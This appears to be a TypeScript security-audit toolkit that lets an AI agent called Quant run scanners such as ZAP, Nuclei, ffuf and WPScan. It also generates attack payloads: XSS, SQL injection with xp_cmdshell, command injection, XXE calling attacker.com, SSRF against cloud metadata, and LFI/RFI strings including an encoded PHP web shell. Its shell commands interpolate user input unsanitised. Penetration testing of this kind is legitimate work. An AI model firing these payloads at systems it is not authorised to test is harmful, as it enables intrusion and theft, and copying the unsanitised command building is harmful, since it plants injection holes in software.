/**
 * securityAuditToolkit.ts — Security auditing & vulnerability scanning
 * Called by Quant (the AI brain) via tool handlers in agentToolsExtended.ts
 */

import { execSync } from "child_process";
import https from "https";
import http from "http";

function fetchUrl(
  url: string,
  timeout = 10000,
): Promise<{ status: number; headers: Record<string, string | string[] | undefined> }> {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith("https") ? https : http;
    const req = mod.get(
      url,
      { timeout, headers: { "User-Agent": "Mozilla/5.0 (compatible; QuantSecurityAudit/1.0)" } },
      (res) => {
        resolve({ status: res.statusCode || 0, headers: res.headers as any });
      },
    );
    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Timeout"));
    });
  });
}

// ─── OWASP ZAP scan ────────────────────────────────────────────────────────
export function owaspZapScan(url: string): string {
  try {
    const cmd = `docker exec kali-box zap-cli quick-scan -s xss,sqli,lfi,rfi -o '-cmd' ${url} 2>&1 | head -50`;
    const output = execSync(cmd, { timeout: 120_000, encoding: "utf8" }).trim();
    return output || "ZAP scan completed — no findings or ZAP not available";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Nuclei scan ────────────────────────────────────────────────────────────
export function nucleiScan(url: string, templates: string): string {
  try {
    const tmpl = templates ? `-t ${templates}` : "";
    const cmd = `docker exec kali-box nuclei -u ${url} ${tmpl} -silent -nc 2>&1 | head -50`;
    const output = execSync(cmd, { timeout: 120_000, encoding: "utf8" }).trim();
    return output || "No vulnerabilities found by Nuclei";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── ffuf fuzz ──────────────────────────────────────────────────────────────
export function ffufFuzz(url: string, wordlist: string, mode: string): string {
  try {
    const wl = wordlist || "/usr/share/wordlists/dirb/common.txt";
    const useMode = mode || "dir";
    let cmd: string;
    if (useMode === "dir") {
      cmd = `docker exec kali-box ffuf -u ${url}/FUZZ -w ${wl} -mc 200,204,301,302,401,403 -t 30 2>&1 | head -40`;
    } else {
      cmd = `docker exec kali-box ffuf -u ${url} -w ${wl} -mc 200,500 -t 30 2>&1 | head -40`;
    }
    const output = execSync(cmd, { timeout: 120_000, encoding: "utf8" }).trim();
    return output || "No interesting findings";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Wfuzz scan ─────────────────────────────────────────────────────────────
export function wfuzzScan(url: string, wordlist: string): string {
  try {
    const wl = wordlist || "/usr/share/wordlists/dirb/common.txt";
    const cmd = `docker exec kali-box wfuzz -c -w ${wl} --hc 404 ${url}/FUZZ 2>&1 | head -40`;
    const output = execSync(cmd, { timeout: 120_000, encoding: "utf8" }).trim();
    return output || "No findings";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── WPScan full ────────────────────────────────────────────────────────────
export function wpscanFull(url: string): string {
  try {
    const cmd = `docker exec kali-box wpscan --url ${url} --enumerate u,p,t --random-user-agent 2>&1 | head -80`;
    const output = execSync(cmd, { timeout: 120_000, encoding: "utf8" }).trim();
    return output || "WPScan completed or not a WordPress site";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── JoomScan ───────────────────────────────────────────────────────────────
export function joomscan(url: string): string {
  try {
    const cmd = `docker exec kali-box joomscan -u ${url} 2>&1 | head -50`;
    const output = execSync(cmd, { timeout: 60_000, encoding: "utf8" }).trim();
    return output || "JoomScan completed or not a Joomla site";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Droopescan ─────────────────────────────────────────────────────────────
export function droopescan(url: string): string {
  try {
    const cmd = `docker exec kali-box droopescan scan drupal -u ${url} 2>&1 | head -40`;
    const output = execSync(cmd, { timeout: 60_000, encoding: "utf8" }).trim();
    return output || "Droopescan completed or not a Drupal site";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── SSL Labs grade ─────────────────────────────────────────────────────────
export async function sslLabsGrade(domain: string): Promise<string> {
  try {
    const url = `https://api.ssllabs.com/api/v3/analyze?host=${domain}&publish=off&fromCache=on&maxAge=24`;
    const data = await new Promise<any>((resolve, reject) => {
      const r = https.get(url, { timeout: 30000 }, (res) => {
        let d = "";
        res.on("data", (c) => (d += c));
        res.on("end", () => {
          try {
            resolve(JSON.parse(d));
          } catch {
            reject(new Error("Parse error"));
          }
        });
      });
      r.on("error", reject);
      r.on("timeout", () => {
        r.destroy();
        reject(new Error("Timeout"));
      });
    });
    if (data.status === "READY" && data.endpoints) {
      const grades = data.endpoints.map((e: any) => ({
        ipAddress: e.ipAddress,
        grade: e.grade,
        gradeTrustIgnored: e.gradeTrustIgnored,
      }));
      return JSON.stringify({ domain, status: data.status, endpoints: grades }, null, 2);
    }
    return `SSL Labs analysis status: ${data.status}. Try again in a few moments.`;
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Security headers full ──────────────────────────────────────────────────
export async function securityHeadersFull(url: string): Promise<string> {
  try {
    const { headers } = await fetchUrl(url);
    const checks = {
      "Strict-Transport-Security": headers["strict-transport-security"],
      "Content-Security-Policy": headers["content-security-policy"],
      "X-Frame-Options": headers["x-frame-options"],
      "X-Content-Type-Options": headers["x-content-type-options"],
      "X-XSS-Protection": headers["x-xss-protection"],
      "Referrer-Policy": headers["referrer-policy"],
      "Permissions-Policy": headers["permissions-policy"],
      "Cross-Origin-Opener-Policy": headers["cross-origin-opener-policy"],
      "Cross-Origin-Embedder-Policy": headers["cross-origin-embedder-policy"],
    };
    const score = Object.values(checks).filter(Boolean).length;
    const grade = score >= 8 ? "A+" : score >= 6 ? "A" : score >= 4 ? "B" : score >= 2 ? "C" : "F";
    return JSON.stringify({ url, grade, score: `${score}/9`, headers: checks }, null, 2);
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── CORS misconfig check ───────────────────────────────────────────────────
export async function corsMisconfigCheck(url: string): Promise<string> {
  try {
    const results: string[] = [];
    const origins = [
      "https://evil.com",
      "null",
      "https://subdomain.evil.com",
      url.replace(/:\/\/.*/, "://attacker.com"),
    ];
    for (const origin of origins) {
      const resp = await new Promise<{
        status: number;
        headers: Record<string, string | string[] | undefined>;
      }>((resolve, reject) => {
        const mod = url.startsWith("https") ? https : http;
        const req = mod.request(
          url,
          {
            method: "OPTIONS",
            headers: { Origin: origin, "Access-Control-Request-Method": "GET" },
            timeout: 10000,
          },
          (res) => {
            resolve({ status: res.statusCode || 0, headers: res.headers as any });
          },
        );
        req.on("error", reject);
        req.on("timeout", () => {
          req.destroy();
          reject(new Error("Timeout"));
        });
        req.end();
      });
      const acao = resp.headers["access-control-allow-origin"];
      const reflect = acao === origin || acao === "*";
      results.push(
        `Origin: ${origin} -> ACAO: ${acao || "none"} ${reflect ? "⚠️ REFLECTED!" : "✅"}`,
      );
    }
    return results.join("\n");
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Open redirect check ────────────────────────────────────────────────────
export async function openRedirectCheck(url: string): Promise<string> {
  try {
    const payloads = [
      "//evil.com",
      "https://evil.com",
      "//evil.com/",
      "https:evil.com",
      "/\\evil.com",
    ];
    const results: string[] = [];
    for (const payload of payloads) {
      const testUrl = `${url}${url.includes("?") ? "&" : "?"}redirect=${encodeURIComponent(payload)}&url=${encodeURIComponent(payload)}&next=${encodeURIComponent(payload)}`;
      const resp = await new Promise<{ status: number; location: string | undefined }>(
        (resolve, reject) => {
          const mod = testUrl.startsWith("https") ? https : http;
          const req = mod.get(
            testUrl,
            { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } },
            (res) => {
              resolve({
                status: res.statusCode || 0,
                location: res.headers.location as string | undefined,
              });
            },
          );
          req.on("error", reject);
          req.on("timeout", () => {
            req.destroy();
            reject(new Error("Timeout"));
          });
        },
      );
      const vulnerable =
        resp.location &&
        (resp.location.includes("evil.com") || (resp.status >= 300 && resp.status < 400));
      results.push(
        `Payload: ${payload} -> Status: ${resp.status}, Location: ${resp.location || "none"} ${vulnerable ? "⚠️ VULNERABLE!" : "✅"}`,
      );
    }
    return results.join("\n");
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── XSS payload generator ──────────────────────────────────────────────────
export function xssPayloadGenerator(context: string): string {
  const payloads: Record<string, string[]> = {
    html: [
      "<script>alert(1)<\\/script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "<body onload=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      "<details open ontoggle=alert(1)>",
      '"><script>alert(1)<\\/script>',
      "javascript:alert(1)",
    ],
    attribute: [
      '" onmouseover=alert(1) "',
      "' onmouseover=alert(1) '",
      '" autofocus onfocus=alert(1) "',
      "' onload=alert(1) '",
      '"><script>alert(1)<\\/script>',
    ],
    js: [
      "';alert(1)//",
      '";alert(1)//',
      "<\\/script><script>alert(1)<\\/script>",
      "${alert(1)}",
      "`${alert(1)}`",
    ],
    url: [
      "javascript:alert(1)",
      "data:text/html,<script>alert(1)<\\/script>",
      "%3Cscript%3Ealert(1)%3C/script%3E",
    ],
  };
  const ctx = context || "html";
  const list = payloads[ctx] || payloads.html;
  return `XSS payloads for ${ctx} context:\n\n${list.map((p) => `  ${p}`).join("\n")}`;
}

// ─── SQLi payload generator ─────────────────────────────────────────────────
export function sqliPayloadGenerator(dbType: string): string {
  const payloads: Record<string, string[]> = {
    mysql: [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL,NULL --",
      "' AND SLEEP(5) --",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    ],
    mssql: [
      "' OR '1'='1' --",
      "'; WAITFOR DELAY '0:0:5' --",
      "' UNION SELECT NULL,@@version,NULL --",
      "'; EXEC xp_cmdshell('whoami') --",
      "' AND 1=CONVERT(int,@@version) --",
    ],
    postgres: [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,version(),NULL --",
      "'; SELECT pg_sleep(5) --",
      "' AND 1=CAST((SELECT version()) AS int) --",
    ],
    oracle: [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,banner,NULL FROM v$version --",
      "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a' --",
    ],
  };
  const db = dbType || "mysql";
  const list = payloads[db] || payloads.mysql;
  return `SQLi payloads for ${db}:\n\n${list.map((p) => `  ${p}`).join("\n")}`;
}

// ─── Command injection test ─────────────────────────────────────────────────
export function commandInjectionTest(url: string, param: string): string {
  const payloads = [";id", "|id", "`id`", "$(id)", ";whoami", "|whoami", "&&whoami", "||whoami"];
  return `Test these payloads against ${url}?${param}=PAYLOAD:\n\n${payloads.map((p) => `  ${param}=${encodeURIComponent(p)}`).join("\n")}\n\nUse http_request tool to send each payload and check for command output in response.`;
}

// ─── XXE vuln check ─────────────────────────────────────────────────────────
export function xxeVulnCheck(url: string): string {
  const payloads = [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>`,
  ];
  return `XXE test payloads for ${url}:\n\n${payloads.map((p, i) => `  Payload ${i + 1}:\n    ${p}`).join("\n\n")}\n\nSend as Content-Type: application/xml`;
}

// ─── SSRF check ─────────────────────────────────────────────────────────────
export function ssrfCheck(url: string, param: string): string {
  const payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://localhost:3000/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://2130706433/", // 127.0.0.1 decimal
    "http://0x7f000001/", // 127.0.0.1 hex
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
  ];
  return `SSRF test payloads for ${url}?${param}=PAYLOAD:\n\n${payloads.map((p) => `  ${param}=${encodeURIComponent(p)}`).join("\n")}`;
}

// ─── LFI/RFI check ──────────────────────────────────────────────────────────
export function lfiRfiCheck(url: string, param: string): string {
  const payloads = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "http://attacker.com/shell.txt",
  ];
  return `LFI/RFI test payloads for ${url}?${param}=PAYLOAD:\n\n${payloads.map((p) => `  ${param}=${encodeURIComponent(p)}`).join("\n")}`;
}

// ─── CSRF token check ───────────────────────────────────────────────────────
export async function csrfTokenCheck(url: string): Promise<string> {
  try {
    const { headers } = await fetchUrl(url);
    const cookies = headers["set-cookie"];
    const hasCsrfCookie =
      cookies && Array.isArray(cookies) && cookies.some((c) => /csrf|xsrf|_token/i.test(c));
    return JSON.stringify(
      {
        url,
        hasCsrfCookie: !!hasCsrfCookie,
        cookies: cookies ? "Present" : "None",
        note: "Check HTML forms for hidden CSRF token fields. SameSite cookie attribute is also important.",
      },
      null,
      2,
    );
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Rate limit check ───────────────────────────────────────────────────────
export async function rateLimitCheck(url: string): Promise<string> {
  try {
    const statuses: number[] = [];
    for (let i = 0; i < 20; i++) {
      const { status } = await fetchUrl(url, 5000);
      statuses.push(status);
      if (status === 429) break;
    }
    const limited = statuses.includes(429);
    return JSON.stringify(
      { url, rateLimited: limited, requestsSent: statuses.length, statuses: statuses.slice(0, 10) },
      null,
      2,
    );
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}

// ─── Dependency audit ───────────────────────────────────────────────────────
export function dependencyAudit(projectPath: string, ecosystem: string): string {
  try {
    let cmd: string;
    switch (ecosystem) {
      case "npm":
        cmd = `cd ${projectPath} && npm audit --json 2>&1 | head -100`;
        break;
      case "pip":
        cmd = `pip-audit -r ${projectPath}/requirements.txt 2>&1 | head -50`;
        break;
      case "cargo":
        cmd = `cd ${projectPath} && cargo audit 2>&1 | head -50`;
        break;
      default:
        cmd = `cd ${projectPath} && npm audit --json 2>&1 | head -100`;
    }
    const output = execSync(cmd, { timeout: 60_000, encoding: "utf8" }).trim();
    return output || "No vulnerabilities found";
  } catch (err) {
    return `Error: ${(err as Error).message}`;
  }
}
